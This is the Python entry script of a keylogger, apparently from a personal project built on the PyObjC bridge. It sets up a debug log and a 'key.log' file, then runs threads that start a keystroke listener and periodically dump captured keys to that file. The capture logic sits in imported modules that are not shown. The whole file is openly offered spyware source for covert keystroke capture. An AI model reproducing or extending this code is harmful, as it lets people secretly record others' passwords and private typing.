#!/usr/bin/env python3
"""
keylog.py
keylogger

Keylogger making use of the PyObjC bridge.

Created by Jakob Beckmann on 21/07/2017.
"""

import time
import sys
import os
from logger import Logger
from timedjobs import Job
from spy import Spy

DEBUGGER_FILENAME = "debug.log"
KEYLOG_FILENAME   = "key.log"
TIMING = 3

def main():
    # Create debug logger
    debugger = Logger(DEBUGGER_FILENAME)
    debugger.write("Debugger launched.", prefix="[+]")

    # Create key logger
    keylog = Logger(KEYLOG_FILENAME)
    debugger.write("Keys logged in file: " + KEYLOG_FILENAME, prefix="[+]")

    try:
        spy = Spy()

        # Set up threads
        spy_thread   = Job(1, "spy_thread", debugger, spy.create_listener,
                           args=keylog, repeat=1)
        print_to_log = Job(2, "print_to_log", debugger, spy.print_and_clear,
                           args=keylog)
        print_to_log.set_timer(TIMING)

        # Start threads
        spy_thread.start()
        print_to_log.start()

        # Wait for completion
        spy_thread.join()
        print_to_log.join()

    except KeyboardInterrupt:
        try:
            # Give time to log keycodes stored in spy's internal variable
            time.sleep(TIMING)
            debugger.write("Terminating before completion ... ", prefix="[-]")
            sys.exit(0)
        except SystemExit:
            os._exit(0)


    # Finish up
    debugger.write("Terminating ... ", prefix="[+]")

if __name__ == "__main__":
        main()

